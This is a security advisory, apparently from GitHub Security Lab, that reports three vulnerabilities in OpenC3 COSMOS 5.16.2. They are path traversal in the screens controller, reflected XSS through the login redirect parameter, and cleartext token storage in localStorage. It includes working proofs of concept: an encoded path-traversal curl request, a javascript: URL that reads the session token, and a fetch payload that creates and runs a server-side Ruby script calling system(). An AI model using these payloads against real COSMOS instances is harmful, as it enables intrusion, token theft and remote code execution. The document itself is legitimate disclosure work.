## Summary

Several vulnerabilities were found in [OpenC3 COSMOS](https://openc3.com/), a web application that is used to control satellites and test equipment. They can lead up to Remote Code Execution (RCE) via cross-site scripting (XSS).

Following issues are part of this report:

* Issue 1: Path traversal via screen controller (`GHSL-2024-127`)
* Issue 2: Cross-site scripting in Login functionality (`GHSL-2024-128`)
* Issue 3: Clear text storage of password/token (`GHSL-2024-129`)

## Project

OpenC3 COSMOS

## Tested Version

[v5.16.2](https://github.com/OpenC3/cosmos/releases/tag/v5.16.2)

## Details

### Issue 1: Path traversal via screen controller (`GHSL-2024-127`)

A path traversal vulnerability inside of `LocalMode`’s `open_local_file` method allowed an authenticated user with adequate permissions to download any `.txt` via the `ScreensController#show` on the web server COSMOS is running on (depending on the file permissions).

The user-controlled parameters `target` and `screen` flow from ScreensController’s [`show`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-cmd-tlm-api/app/controllers/screens_controller.rb#L27) method:

```
  def show
    return unless authorization('system')
    screen = Screen.find(*params.require([:scope, :target, :screen]))
[..]

```

into the [`self.find`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-cmd-tlm-api/app/models/screen.rb#L39) class method of `Screen`:

```
def self.find(scope, target, screen)
    name = screen.split('*')[0].downcase # Split '*' that indicates modified - Filenames are lowercase
    body(scope, "#{target}/screens/#{name}.txt")
end

```

In this method the parameters are joined to a partial path separated by the folder `screens` and terminated by the extension `.txt`.
This partial path then flows into the [`self.body`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3/lib/openc3/utilities/target_file.rb#L92) class method of `TargetFile`:

```
def self.body(scope, name)
  name = name.split('*')[0] # Split '*' that indicates modified
  # First try opening a potentially modified version by looking for the modified target
  if ENV['OPENC3_LOCAL_MODE']
    local_file = OpenC3::LocalMode.open_local_file(name, scope: scope)
    return local_file.read if local_file
  end
[..]

```

This class method then calls [`self.open_local_file`](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3/lib/openc3/utilities/local_mode.rb#L393) in `LocalMode` if the env variable `OPENC3_LOCAL_MODE` is set to `1` (the default):

```
def self.open_local_file(path, scope:)
  full_path = "#{OPENC3_LOCAL_MODE_PATH}/#{scope}/targets_modified/#{path}"
  return File.open(full_path, 'rb')
[..]

```

There the path gets joined again and then flows into a `File.open` sink.

This vulnerability was discovered with the help of CodeQL’s [Uncontrolled data used in path expression](https://codeql.github.com/codeql-query-help/ruby/rb-path-injection/) query.

#### Proof of concept

Putting the different path strings from above together, gives us roughly following pattern:

```
full_path = "/plugins/DEFAULT/targets_modified/#{params[:target]}/screens/#{params[:name]}.txt"
return File.open(full_path, 'rb')

```

The default values for `OPENC3_LOCAL_MODE_PATH` and scope are used. The URL parameters `params[:target]` and `params[:screen]` are user-controllable. Both have to be properly fed for this path traversal to be exploitable: While the initial path `/plugins/DEFAULT/targets_modified/` exists on the COSMOS docker image, no subfolder named `screens` exists in this folder. Due to Linux being [fairly unforgiving](https://x.com/ulldma/status/1086249703497453568) when traversing paths a folder named `screens` has to exist somewhere. On the COSMOS docker image a folder named `screens` exists inside of `/openc3/templates/target/targets/TARGET/`. That means the URL parameter `target` needs to be used to get into that folder. The URL parameter `screen` can then be used to get to any `.txt` file.

So to fetch the file at `/openc3/python/requirements.txt` following values have to be passed to the URL parameters:

```
target = "../../../../../../openc3/templates/target/targets/TARGET"
screen = "../../../../../../openc3/python/requirements"

```

Put together as a curl command this would look like this:

```
curl --path-as-is -i -s -k -X $'GET' \
    -H $'Authorization: <cosmos-token>' -H $'User-Agent: Mozilla/5.0' -H $'Accept: text/html' \
    $'https://<cosmos-host>/openc3-api/screen/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fopenc3%2ftemplates%2ftarget%2ftargets%2fTARGET/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fopenc3%2fpython%2frequirements?scope=DEFAULT'

```

(The values for `<cosmos-host>` and `<cosmos-token>` need to be replaced.)

### Issue 2: Cross-site scripting in Login functionality (`GHSL-2024-128`)

The login functionality of OpenC3 COSMOS (OSS Edition) contained a reflected cross-site scripting (XSS) vulnerability in [Login.vue](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue). An attacker can specify a malicious `redirect` query parameter to trigger the vulnerability. If a JavaScript URL is passed to the `redirect` parameter the attacker provided JavaScript will be executed after the user entered their password and clicked on login.

The redirect query parameter flows unchecked [from](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue#L145):

```
const redirect = new URLSearchParams(window.location.search).get(
      'redirect',
)

```

into the `window.location` [sink](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue#L148):

```
window.location = decodeURI(redirect || '/')

```

This URL needs to be accessed by a user who can reach the COSMOS instance. So an attacker might redirect a user to this URL (e.g. via Phishing email, redirect from a malicious website).

This vulnerability was discovered with the help of CodeQL’s [Client-side cross-site scripting](https://codeql.github.com/codeql-query-help/javascript/js-xss/) query.

#### Proof of concept

An attacker can send the following link to a victim, who will login:

```
https://<cosmos-host>/login?redirect=javascript:alert(localStorage.openc3Token)

```

For sake of demonstration, the password of the user will be displayed in an alert. Arbitrary javascript can be executed by the attacker in the context of the victim’s session.

Due the possibility of executing code inside the script runner instance an attacker also has the possibility of creating a JavaScript which will lead to code/command execution on the server side. For example, following JavaScript creates the script `testc4.rb` with the content `system('id > /tmp/pwned4.txt')` on the server. And then calls the endpoint to run this script, which will lead to the creation of the file `/tmp/pwned4.txt` inside of the script runner.

```
fetch("/script-api/scripts/testc4.rb?scope=DEFAULT", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Authorization": localStorage.openc3Token
        },
        body: "{\"text\":\"system('id > /tmp/pwned4.txt')\"}"
    })
    .then(data => {
        fetch("/script-api/scripts/testc4.rb/run?scope=DEFAULT", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": localStorage.openc3Token
                },
                body: "{}"
            }).then(console.log("Script executed"))
    });

```

So a more powerful proof of concept that executes code on the server instance of the script runner would look like this:

```
https://<cosmos-host>/login?redirect=javascript:fetch(%22/script-api/scripts/testc5.rb?scope=DEFAULT%22,%7Bmethod:%20%22POST%22,headers:%20%7B%22Content-Type%22:%20%22application/json%22,%22Authorization%22:%20localStorage.openc3Token%7D,body:%20%22%7B%5C%22text%5C%22:%5C%22system('id%20%3E%20/tmp/pwned5.txt')%5C%22%7D%22%7D).then(data%20=%3E%20%7Bfetch(%22/script-api/scripts/testc5.rb/run?scope=DEFAULT%22,%20%7Bmethod:%20%22POST%22,headers:%20%7B%22Content-Type%22:%20%22application/json%22,%22Authorization%22:%20localStorage.openc3Token%7D,body:%20%22%7B%7D%22%7D).then(console.log(%22Script%20executed%22))%7D);

```
#### Impact

This issue may lead up to Remote Code Execution (RCE).

### Issue 3: Clear text storage of password/token (`GHSL-2024-129`)

OpenC3 COSMOS (OSS Edition) stored the password of a user unencrypted in the LocalStorage of a web browser. This makes the user password susceptible to exfiltration via Cross-site scripting (see GHSL-2024-128) - This could get an attacker a more permanent foothold in the COSMOS instance; assuming the COSMOS instance is accessible to the attacker. The same is true for a local attacker who could access the local storage directly (in contrast to stealing a session-id that automatically expires after some time).

[Login](https://github.com/OpenC3/cosmos/blob/a3f4b9a3ccb9097fd9d1a73645886ad60c83f754/openc3-cosmos-init/plugins/packages/openc3-tool-common/src/tools/base/components/Login.vue#L144) function in Login.vue where the password of the user is stored in the local storage of the browser:

```
login: function () {
  localStorage.openc3Token = this.password

```

This vulnerability was discovered with the help of CodeQL’s [Clear text storage of sensitive information](https://codeql.github.com/codeql-query-help/javascript/js-clear-text-storage-of-sensitive-data/) query.

#### Proof of concept

An attacker can send the following link to a victim, who will login. Instead of displaying the password/token in an alert box the attacker could send the token to a remote server under their control. (This proof of concept makes use of the XSS vulnerability described in `GHSL-2024-128`)

```
https://<cosmos-host>/login?redirect=javascript:alert(localStorage.openc3Token)

```
